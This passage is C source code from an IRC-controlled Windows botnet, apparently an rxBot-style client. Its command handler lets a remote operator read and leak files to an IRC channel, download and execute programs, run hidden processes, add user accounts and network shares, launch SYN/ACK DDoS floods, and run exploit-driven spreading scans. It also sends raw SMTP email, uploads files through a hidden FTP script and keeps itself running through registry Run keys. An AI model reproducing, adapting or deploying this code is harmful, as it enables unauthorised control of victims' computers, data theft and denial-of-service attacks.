					}
				}
				
				return repeat;
			}
			#endif
			else if (strcmp(readfile_cmd, a[s]) == 0) {
				FILE *fp;
				if ((fp = fopen(a[s+1],"r")) != NULL) {
					while (fgets(sendbuf,sizeof(sendbuf),fp) != NULL)
						irc_privmsg(sock, a[2], sendbuf, notice, TRUE);
					fclose(fp);
					sprintf(sendbuf,"8::[4MaIn8]:: Read file complete: %s",a[s+1]);
				} else {
					sprintf(sendbuf,"8::[4MaIn8]:: Read file failed: %s",a[s+1]);
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				}
				addlog(sendbuf);

				return repeat;
			}
			#ifndef NO_IDENT
			else if (strcmp(ident_cmd, a[s]) == 0) {
				if (strcmp("on", a[s+1]) == 0) {
					if (findthreadid(IDENT_THREAD) > 0)
						sprintf(sendbuf ,"8::[4IdEnT8]:: Already running.");
					else {
						sprintf(sendbuf,"8::[4IdEnT8]:: Server running on Port: 113.");
						i = addthread(sendbuf,IDENT_THREAD,NULL);
						if ((threads[i].tHandle = CreateThread(NULL, 0, &IdentThread, (LPVOID)i, 0, &id)) == NULL)
							sprintf(sendbuf,"8::[4IdEnT8]:: Failed to start server, error: <%d>.", GetLastError());
					}
				}
				else if (strcmp("off", a[s+1]) == 0) {
					if ((i=killthreadid(IDENT_THREAD)) > 0)
						sprintf(sendbuf,"8::[4IdEnT8]:: Server stopped. (%d thread(s) stopped.)",i);
					else
						sprintf(sendbuf,"8::[4IdEnT8]:: No thread found.");
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_NET
			else if (strcmp(net_cmd, a[s]) == 0) {
				if((!noadvapi32) || (!nonetapi32)) {
					if (x != NULL) {
						char *y = NULL;
						if (a[s+2]) 
							y = strstr(x, a[s+2]);
						if (strcmp("start", a[s+1]) == 0)
							if (a[s+2])
								sprintf(sendbuf, "%s", Services(NET_START, y));
							else {
								if (ListServices(sock, a[2], notice))
									sprintf(sendbuf, "8::[4NeT8]:: Service list completed.");
								else
									sprintf(sendbuf, "8::[4NeT8]:: Service list failed.");
							}
						else if (strcmp("stop", a[s+1]) == 0)
							sprintf(sendbuf, "%s", Services(NET_STOP, y));
						else if (strcmp("pause", a[s+1]) == 0)
							sprintf(sendbuf, "%s", Services(NET_PAUSE, y));
						else if (strcmp("continue", a[s+1]) == 0)
							sprintf(sendbuf, "%s", Services(NET_CONTINUE, y));
						else if (strcmp("delete", a[s+1]) == 0)
							sprintf(sendbuf, "%s", Services(NET_DELETE, y));
						else if (strcmp("share", a[s+1]) == 0) {
							if (a[s+2]) {
								if (parameters['d'])
									sprintf(sendbuf, "%s", Shares(NET_DELETE, a[s+2]));
								else
									sprintf(sendbuf, "%s", Shares(NET_ADD, a[s+2], a[s+3]));
							} else {
								if (ListShares(sock, a[2], notice))
									sprintf(sendbuf, "8::[4NeT8]:: Share list completed.");
								else
									sprintf(sendbuf, "8::[4NeT8]:: Share list failed.");
							}
						}
						else if (strcmp("user", a[s+1]) == 0) {
							if (a[s+2]) {
								if (parameters['d'])
									sprintf(sendbuf, "%s", Users(NET_DELETE, a[s+2], NULL, sock, a[2], notice));
								else {
									if (a[s+3])
										sprintf(sendbuf, "%s", Users(NET_ADD, a[s+2], a[s+3], sock, a[2], notice));
									else
										sprintf(sendbuf, "%s", Users(NET_INFO, a[s+2], NULL, sock, a[2], notice));
								}
							} else {
								if (ListUsers(sock, a[2], notice))
									sprintf(sendbuf, "8::[4NeT8]:: User list completed.");
								else
									sprintf(sendbuf, "8::[4NeT8]:: User list failed.");
							}
						}
						else if (strcmp("send", a[s+1]) == 0) {
							if (a[s+2])
								sprintf(sendbuf, "%s", NetSend(y, sock, a[2], notice));
							else
								sprintf(sendbuf, "8::[4NeT8]:: No message specified.");
						}
						else
							sprintf(sendbuf,"8::[4NeT8]:: Command unknown.");
					}
				} else
					sprintf(sendbuf, "8::[4NeT8]:: Failed to load advapi32.dll or netapi32.dll.");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);
			
				return repeat;
			}
			#endif
			else if (strcmp(gethost_cmd, a[s]) == 0) { 
				if(strstr(host, a[s+1])) {
					if (a[s+2]) {
						char *y = strstr(x, a[s+2]);
						if (y != NULL) {
							sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], y);
							strncpy(line,  sendbuf, (IRCLINE-1));
							sprintf(sendbuf,"8::[4MaIn8]:: Gethost: %s, Command: %s", a[s+1],y);
							repeat++;
						} else
							sprintf(sendbuf,"8::[4MaIn8]:: Unable to extract Gethost command.");							
					} else {
						irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
						_snprintf(sendbuf,sizeof(sendbuf),"8::[4MaIn8]:: Gethost: %s.",a[s+1]);
					}
					addlog(sendbuf);
				}

				return repeat;
			}

			// commands requiring at least 2 parameters
			else if (a[s+2] == NULL) return 1;
			else if (strcmp(addalias_cmd, a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						addalias(a[s+1], y);
						sprintf(sendbuf,"8::[4MaIn8]:: Alias added: %s.", a[s+1]);
						if(!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
				}

				return 1;
			}
			else if (strcmp(privatemessage_cmd, a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						irc_privmsg(sock, a[s+1], y, FALSE);
						addlogv("8::[4MaIn8]:: Privmsg: %s: %s.",a[s+1], y);
					}
				}

				return repeat;
			}
			else if (strcmp(action_cmd, a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						sprintf(sendbuf, "\1ACTION %s\1", y);
						irc_privmsg(sock, a[s+1], sendbuf, FALSE);
						addlogv("8::[4MaIn8]:: Action: %s: %s.",a[s+1], y);
					}
				}

				return repeat;
			}
			else if (strcmp(cycle_cmd, a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) 
					return 1;
				irc_sendv(sock, "PART %s\r\n", a[s+2]);
				Sleep(atoi(a[s+1])*1000);
				irc_sendv(sock, "JOIN %s %s\r\n", a[s+2], a[s+3]);
				addlog("8::[4MaIn8]:: Cycle.");

				return repeat;
			}
			else if (strcmp(mode_cmd, a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						irc_sendv(sock, "MODE %s\r\n", y);
						addlogv("8::[4MaIn8]:: Mode change: %s",y);
					}
				}

				return repeat;
			}
			else if (strcmp(c_raw_cmd, a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
						irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", y);
						addlogv("8::[4ClOnE8]:: Raw (%s): %s", a[s+1], y);
					}

				}

				return repeat;
			}
			else if (strcmp(c_mode_cmd, a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) 
						sprintf(sendbuf, "MODE %s", y);
					if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
						irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", sendbuf);
						addlogv("8::[4ClOnE8]:: Mode (%s): %s", a[s+1], y);
					}
				}

				return repeat;
			}
			else if (strcmp(c_nick_cmd, a[s]) == 0) {
				sprintf(sendbuf, "NICK %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) { 
					irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", sendbuf);
					addlogv("8::[4ClOnE8]:: Nick (%s): %s", a[s+1], a[s+2]);
				}

				return repeat;
			}
			else if (strcmp(c_join_cmd, a[s]) == 0) {
				sprintf(sendbuf, "JOIN %s %s", a[s+2], a[s+3]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) 
					irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", sendbuf);

				return repeat;
			}
			else if (strcmp(c_part_cmd, a[s]) == 0) {
				sprintf(sendbuf, "PART %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) 
					irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", sendbuf);

				return repeat;
			}
			else if (strcmp(repeat_cmd, a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					if (strcmp(a[s+2]+1,"repeat") != 0) {
						sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
						strncpy(line,  sendbuf, (IRCLINE-1));
						sprintf(sendbuf,"8::[4MaIn8]:: Repeat: %s", r);
						addlog(sendbuf);

						if (atoi(a[s+1]) > 0) 
							return repeat + atoi(a[s+1]); 
						else 
							return repeat;
					} else {
						sprintf(sendbuf,"8::[4MaIn8]:: Repeat not allowed in command line: %s", r);
						if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
						addlog(sendbuf);
					}
				}

				return repeat;
			}
			else if (strcmp(delay_cmd, a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) 
						Sleep(atoi(a[s+1])*1000);
					addlog("8::[4MaIn8]:: Delay.");
					return repeat + 1;
				}

				return 1;
			}
			#ifndef NO_DOWNLOAD
			else if (strcmp(update_cmd, a[s]) == 0) {
				if (strcmp(botid, a[s+2]) != 0) {
					char tempdir[MAX_PATH], tmpbuf[MAXNICKLEN];
					GetTempPath(sizeof(tempdir), tempdir);

					DOWNLOAD dl;
					strncpy(dl.url,  a[s+1], sizeof(dl.url)-1);
					sprintf(dl.dest, "%s%s.exe", tempdir, rndnickletter(tmpbuf));
					dl.update = 1;
					dl.run = 0;
					dl.expectedcrc=((a[s+3])?(strtoul(a[s+3],0,16)):(0));
					dl.filelen=((a[s+4])?(atoi(a[s+4])):(0));
					dl.encrypted=(parameters['e']);

					dl.sock = sock;
					strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
					dl.notice=notice;
					dl.silent = silent;

					sprintf(sendbuf, "8::[4UpDaTe8]:: Downloading update from: %s.", a[s+1]);
					dl.threadnum = addthread(sendbuf, UPDATE_THREAD, sock);
					if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
						while(dl.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"8::[4UpDaTe8]:: Failed to start download thread, error: <%d>.", GetLastError());
				} else
					sprintf(sendbuf,"8::[4UpDaTe8]:: Bot ID must be different than current running process.");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#endif
			else if (strcmp(execute_cmd, a[s]) == 0) {
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				memset(&sinfo, 0, sizeof(STARTUPINFO));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = STARTF_USESHOWWINDOW;
				sinfo.wShowWindow=SW_HIDE;
				if (atoi(a[s+1]) == 1) sinfo.wShowWindow=SW_SHOW;
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) 
						if (!CreateProcess(NULL, y, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo))
							sprintf(sendbuf,"8::[4ExEc8]:: Couldn't execute file.");
						else
							sprintf(sendbuf,"8::[4ExEc8]:: Commands: %s",y);
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#ifndef NO_FINDFILE
			else if (strcmp(findfile_cmd, a[s]) == 0) { 
				FFIND ffind;
				_snprintf(ffind.filename,sizeof(ffind.filename),a[s+1]);
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) 
						sprintf(ffind.dirname,y);
				}
				_snprintf(ffind.chan,sizeof(ffind.chan),a[2]);
				ffind.sock = sock;
				ffind.notice = notice;
				ffind.silent = silent;

				_snprintf(sendbuf, sizeof(sendbuf),"8::[4FiNd FiLe8]:: Searching for file: %s in: %s.", ffind.filename, ffind.dirname);
				ffind.threadnum = addthread(sendbuf, FIND_THREAD, NULL);
				if (threads[ffind.threadnum].tHandle = CreateThread(NULL, 0, &FindFileThread, (LPVOID)&ffind, 0, &id)) {
					while (ffind.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"8::[4FiNd FiLe8]:: Failed to start search thread, error: <%d>.", GetLastError());
				addlog(sendbuf);

				return 1;
			}
			#endif
			else if (strcmp(rename_cmd, a[s]) == 0) {
				if (MoveFile(a[s+1],a[s+2]))
					_snprintf(sendbuf,sizeof(sendbuf),"8::[4FiLe8]:: Rename: '%s' to: '%s'.", a[s+1], a[s+2]);
				else 
					_snprintf(sendbuf,sizeof(sendbuf),PrintError("8::[4FiLe8]::"));

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}

			// commands requiring at least 3 parameters
			else if (a[s+3] == NULL) return 1;
			#ifndef NO_DDOS
			else if (strcmp("ddos.syn", a[s]) == 0 || strcmp("ddos.ack", a[s]) == 0 || strcmp("ddos.random", a[s]) == 0) {
				DDOS ddos;
				strncpy(ddos.ip, a[s+1], sizeof(ddos.ip)-1);
				strncpy(ddos.port, a[s+2], sizeof(ddos.port)-1);
				strncpy(ddos.length, a[s+3], sizeof(ddos.length)-1);
				strncpy(ddos.chan, a[2], sizeof(ddos.chan)-1);
				strncpy(ddos.type,a[s],32);
				ddos.notice = notice;
				ddos.silent = silent;
				ddos.sock = sock;

				sprintf(sendbuf, "[DDoS]: Flooding: (%s:%s) for %s seconds.", a[s+1], a[s+2], a[s+3]);
				ddos.threadnum = addthread(sendbuf,DDOS_THREAD,NULL);
				if (threads[ddos.threadnum].tHandle = CreateThread(NULL, 0, &DDOSThread, (LPVOID)&ddos, 0, &id)) {
					while(ddos.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"[DDoS]: Failed to start flood thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			else if (strcmp(clone_cmd, a[s]) == 0) {
				IRC irc;
				strncpy(irc.host,  a[s+1], sizeof(irc.host)-1);
				irc.port = atoi(a[s+2]);
				strncpy(irc.channel,  a[s+3], sizeof(irc.channel)-1);
				if (a[s+4]) 
					strncpy(irc.chanpass,  a[s+4], sizeof(irc.chanpass)-1);
				irc.spy = 1;

				sprintf(sendbuf, "8::[4ClOnEs8]:: Created on %s:%d, in channel %s.", irc.host, irc.port, irc.channel);
				irc.threadnum = addthread(sendbuf, CLONE_THREAD, NULL);
				if (threads[irc.threadnum].tHandle = CreateThread(NULL, 0, &irc_connect, (LPVOID)&irc, 0, &id)) {
					while(irc.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"8::[4ClOnEs8]:: Failed to start clone thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#ifndef NO_DOWNLOAD
			else if (strcmp(download_cmd, a[s]) == 0) {
				DOWNLOAD dl;
				strncpy(dl.url, a[s+1], sizeof(dl.url)-1);
				strncpy(dl.dest, a[s+2], sizeof(dl.dest)-1);
				dl.update = 0;
				dl.run = ((a[s+3])?(atoi(a[s+3])):(0));
				dl.expectedcrc=((a[s+4])?(strtoul(a[s+4],0,16)):(0));
				dl.filelen=((a[s+5])?(atoi(a[s+5])):(0));
				dl.encrypted=(parameters['e']);

				dl.sock = sock;
				strncpy(dl.chan,  a[2], sizeof(dl.chan)-1);
				dl.notice=notice;
				dl.silent = silent;

				sprintf(sendbuf, "8::[4DoWnLoAd8]:: Downloading URL: %s to: %s.", a[s+1], a[s+2]);
				dl.threadnum = addthread(sendbuf, DOWNLOAD_THREAD, sock);
				if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id)) {
					while(dl.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"8::[4DoWnLoAd8]:: Failed to start transfer thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);
				
				return 1;
			}
			#endif
			#ifndef NO_SCAN
			else if (strcmp(portscan_cmd, a[s]) == 0) {
				SCAN scan;
				scan.addy.S_un.S_addr = finet_addr(a[s+1]);
				scan.port = atoi(a[s+2]);
				scan.delay = atoi(a[s+3]);
				scan.sock = sock;
				strncpy(scan.chan,  a[2], sizeof(scan.chan)-1);
				scan.notice = notice;
				scan.silent = silent;

				sprintf(sendbuf, "8::[4ScAn8]:: Port scan started: %s:%d with delay: %d(ms).", finet_ntoa(scan.addy), scan.port, scan.delay);
				scan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
				if (threads[scan.threadnum].tHandle = CreateThread(NULL, 0, &ScanThread, (LPVOID)&scan, 0, &id)) {
					while(scan.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"8::[4ScAn8]:: Failed to start scan thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif 
			else if (strcmp(c_privatemessage_cmd, a[s]) == 0) {
				if (threads[atoi(a[s+1])].nick[0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
						irc_privmsg(threads[atoi(a[s+1])].sock, a[s+2], y, FALSE);
						if (threads[atoi(a[s+1])].name[0] == 's') {
							sprintf(sendbuf, "[%s] <%s> %s", a[s+2], threads[atoi(a[s+1])].nick, y);
							irc_privmsg(sock, a[2], sendbuf, notice);
						}
					}
				}

				return repeat;
			}
			else if (strcmp(c_action_cmd, a[s]) == 0) {
				if (threads[atoi(a[s+1])].nick[0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					sprintf(sendbuf, "\1ACTION %s\1", y);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
						irc_privmsg(threads[atoi(a[s+1])].sock, a[s+2], sendbuf, FALSE);
						if (threads[atoi(a[s+1])].name[0] == 's') {
							sprintf(sendbuf, "[%s] * %s %s", a[s+2], threads[atoi(a[s+1])].nick, y);
							irc_privmsg(sock, a[2], sendbuf, notice);
						}
					}
				}

				return repeat;
			}

			// commands requiring at least 4 parameters
			else if (a[s+4] == NULL) return 1;
			#ifndef NO_ADVSCAN
			else if (strcmp(advscan_cmd, a[s]) == 0) {
				int scanthreads=findthreadid(SCAN_THREAD);
				if (scanthreads + atoi(a[s+2]) > MAXSCANTHRD) {
					sprintf(sendbuf ,"8::[4ScAn8]:: Already %d scanning threads. Too many specified.", scanthreads);
					irc_privmsg(sock,a[2],sendbuf,notice);
				} else {
					ADVSCAN advscan;
					advscan.port = atoi(a[s+1]); 
					advscan.threads = atoi(a[s+2]);
					advscan.delay = atoi(a[s+3]);
					advscan.delay = ((advscan.delay < 5)?(5):(advscan.delay));
					advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
					advscan.minutes = atoi(a[s+4]);
					advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
					advscan.exploit = -1;

					for(i=0;exploit[i].port != 0;i++) {
						if (strcmp(exploit[i].command, a[s+1]) == 0) {
							advscan.port = exploit[i].port;
							advscan.exploit = i;

							break;
						}
					}

					if (advscan.port == 0) {
						sprintf(sendbuf, "8::[4ScAn8]:: Failed to start scan, port is invalid.");
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);

						return 1;
					}

					if (a[s+5] && a[s+5][0] != '#') {
						_snprintf(advscan.ip,sizeof(advscan.ip),a[s+5]);
						advscan.random = ((strchr(a[s+5],'x'))?(TRUE):(FALSE));
					} else {
						if (parameters['a'] || parameters['b'] || parameters['r']) {
							SOCKADDR_IN ssin;
							int ssin_len=sizeof(ssin);
							fgetsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
							ssin.sin_addr.S_un.S_addr&=(parameters['a']) ? 0xFF : 0xFFFF;
							strncpy(advscan.ip,finet_ntoa(ssin.sin_addr), sizeof(advscan.ip));

							if (parameters['r']) {
								int extractip = ((parameters['a']) ? 3 : 2);
								for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
							
								advscan.random = TRUE;
							} else
								advscan.random = FALSE;
						} else {
							sprintf(sendbuf, "8::[4ScAn8]:: Failed to start scan, no IP specified.");
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							addlog(sendbuf);
							
							return 1;
						}
					}

					advscan.sock = sock;
					advscan.notice = notice;
					advscan.silent = silent;
					_snprintf(advscan.chan,sizeof(advscan.chan),a[2]);
					if (a[s+6])
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+6]);
					else if (a[s+5] && a[s+5][0] == '#')
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+5]);
					else if (strcmp(exploitchan,"") != 0)
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),exploitchan);
					else
						advscan.msgchan[0] = '\0';

					sprintf(sendbuf, "8::[4%s8]:: %s Scan started at [15 %s 8]:%d for %d minutes with a %d second delay using %d threads.", 
						exploit[i].name, ((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.minutes, advscan.delay, advscan.threads);
					advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
					if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
						while(advscan.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"8::[4ScAn8]:: Failed to start scan thread, error: <15 %d 1>.", GetLastError());

					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);

					return 1;
				}
			}
			#endif
		    else if (strcmp(email_cmd, a[s]) == 0 ) {
				WORD version = MAKEWORD(1,1);
				WSADATA wsaData;
				char server[256], sender_email[256], recp_email[256], subject[256], myBuf[256], BigBuf[1024];
				int port, nRet;

				strcpy(server,a[s+1]);
				port = atoi(a[s+2]);
				strcpy(sender_email,a[s+3]);
				strcpy(recp_email,a[s+4]);
				strcpy(subject,replacestr(a[s+5],"_"," "));
				fWSAStartup(version, &wsaData);

				LPHOSTENT lpHostEntry;
				lpHostEntry = fgethostbyname(server);

				SOCKET MailSocket;
				MailSocket = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

				SOCKADDR_IN saServer;
				saServer.sin_family = AF_INET;
				saServer.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list);
				saServer.sin_port = fhtons((unsigned short)port);
				sprintf(BigBuf,"helo $rndnick\nmail from: <%s>\nrcpt to: <%s>\ndata\nsubject: %s\nfrom: %s\n%s\n.\n",sender_email,recp_email,subject,sender_email,subject);
				nRet = fconnect(MailSocket, (LPSOCKADDR)&saServer, sizeof(saServer));
				nRet = frecv(MailSocket, myBuf, sizeof(myBuf), 0);
				nRet = fsend(MailSocket,  BigBuf, strlen(myBuf), 0);
				nRet = frecv(MailSocket, myBuf, sizeof(myBuf), 0);
				fclosesocket(MailSocket);
				fWSACleanup();

				sprintf(sendbuf, "8::[4EmAiL8]:: Message sent to %s.",recp_email);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			#ifndef NO_HTTP
			else if (strcmp(httpcon_cmd, a[s]) == 0) { 
				HTTP_Connect(sock,a[2],notice,silent,a[s+1],atoi(a[s+2]),a[s+3],a[s+4],a[s+5]);

				return repeat;
			}
			#endif

			// commands requiring at least 5 parameters 
		    else if (a[s+5] == NULL) return 1; 
			else if (strcmp(upload_cmd, a[s]) == 0) { 
				if (!FileExists(a[s+5])) { 
					sprintf(sendbuf,"8::[4FtP8]:: File not found: %s.", a[s+5]);
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					addlog(sendbuf);
					return 1; 
				} 
				char tmpftp[MAX_PATH],tmpsys[MAX_PATH]; 

				srand(GetTickCount());
				sprintf(tmpftp,"%s\\%i%i%i.dll",tmpsys,rand()%999,rand()%99,rand()%9); 

				FILE * fp = fopen(tmpftp,"ab"); 
				if (fp != NULL) { 
					fprintf(fp, "open %s\r\n%s\r\n%s\r\n%s\r\nput %s\r\nbye\r\n",
						a[s+1],a[s+2],a[s+3],a[s+4],a[s+5]); 
					fclose(fp); 

					char cmdline[256]; 
					sprintf(cmdline,"-s:%s",tmpftp); 
					if (fShellExecute(0, "open", "ftp.exe", cmdline, NULL, SW_HIDE))
						sprintf("8::[4FtP8]:: Uploading file: %s to: %s",a[s+5],a[s+1]);
					else
						sprintf("8::[4FtP8]:: Uploading file: %s to: %s failed.",a[s+5],a[s+1]);

					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice); 
					addlog(sendbuf);
		
					while (FileExists(tmpftp)) 
						remove(tmpftp); 
				}

				return 1;
			}
		}
	}

	return repeat;
}


#ifndef NO_REGISTRY
int registry_delay=60000;
#endif

AUTOSTART autostart[]={
	{HKEY_LOCAL_MACHINE,(LPCTSTR)regkey1},
	{HKEY_LOCAL_MACHINE,(LPCTSTR)regkey2},
	{HKEY_CURRENT_USER,(LPCTSTR)regkey1}
};

void AutoStartRegs(char *nfilename)
{
	HKEY key;

	for (int i=0; i < (sizeof(autostart) / sizeof(AUTOSTART)); i++) {
		fRegCreateKeyEx(autostart[i].hkey, autostart[i].subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		if (nfilename)
			fRegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)nfilename, strlen(nfilename));
		else
			fRegDeleteValue(key, valuename); 
		fRegCloseKey(key); 
	}
   
	return;
}

#ifndef NO_REGISTRY
DWORD WINAPI AutoRegistry(LPVOID param)
{
	char *nfilename = (char *)param;

	while (1) {
		AutoStartRegs(nfilename);
		Sleep(registry_delay);
	}
	return 0;
}
#endif


#ifndef NO_VISIT

DWORD WINAPI VisitThread(LPVOID param)
{
	HINTERNET ch = 0, req = 0;

	const char *accept = "*/*";
	char vhost[128], vuser[128], vpass[128], vpath[256], sendbuf[IRCLINE];

	VISIT visit = *((VISIT *)param);
	VISIT *visits = (VISIT *)param;
	visits->gotinfo = TRUE;

	// zero out string varaiables
	memset(vhost, 0, sizeof(vhost));
	memset(vuser, 0, sizeof(vuser));
	memset(vpass, 0, sizeof(vpass));
	memset(vpath, 0, sizeof(vpath));

	// zero out url structure and set options
	URL_COMPONENTS url;
	memset(&url, 0, sizeof(url));
	url.dwStructSize = sizeof(url);
	url.dwHostNameLength = 1;
    url.dwUserNameLength = 1;
    url.dwPasswordLength = 1;
    url.dwUrlPathLength = 1;

	do {
		// crack the url (break it into its main parts)
		if (!fInternetCrackUrl(visit.host, strlen(visit.host), 0, &url)) {
			sprintf(sendbuf,"8::[4ViSiT8]:: Invalid URL.");
			break;
		}
		if (url.dwHostNameLength > 0) 
			strncpy(vhost, url.lpszHostName, url.dwHostNameLength);
		int vport = url.nPort;
		if (url.dwUserNameLength > 0) 
			strncpy(vuser, url.lpszUserName, url.dwUserNameLength);
		if (url.dwPasswordLength > 0) 
			strncpy(vpass, url.lpszPassword, url.dwPasswordLength);
		if (url.dwUrlPathLength > 0) 
			strncpy(vpath, url.lpszUrlPath, url.dwUrlPathLength);

		ch = fInternetConnect(ih, vhost,(unsigned short)vport, vuser, vpass, INTERNET_SERVICE_HTTP, 0, 0);
		if (ch == NULL) {
			sprintf(sendbuf,"8::[4ViSiT8]:: Could not open a connection.");
			break;
		}

		req = fHttpOpenRequest(ch, NULL, vpath, NULL, visit.referer, &accept, INTERNET_FLAG_NO_UI, 0);
		if (req == NULL) {
			sprintf(sendbuf,"8::[4ViSiT8]:: Failed to connect to HTTP server.");
			break;
		}

		if (fHttpSendRequest(req, NULL, 0, NULL, 0))
			sprintf(sendbuf,"8::[4ViSiT8]:: URL visited.");
		else
			sprintf(sendbuf,"8::[4ViSiT8]:: Failed to get requested URL from HTTP server.");		
	} while(0); // always false, so this never loops, only helps make error handling easier

	if (!visit.silent) irc_privmsg(visit.sock, visit.chan, sendbuf, visit.notice);
	addlog(sendbuf);

	fInternetCloseHandle(ch);
	fInternetCloseHandle(req);

	clearthread(visit.threadnum);

	ExitThread(0);
}
#endif

#ifndef NO_DCC

SOCKET CreateSock(char *host, int port)
{
	SOCKET ssock;
	if ((ssock = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return INVALID_SOCKET;

	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)port);

	IN_ADDR in;
	in.s_addr = finet_addr(host);
	LPHOSTENT Hostent = NULL;
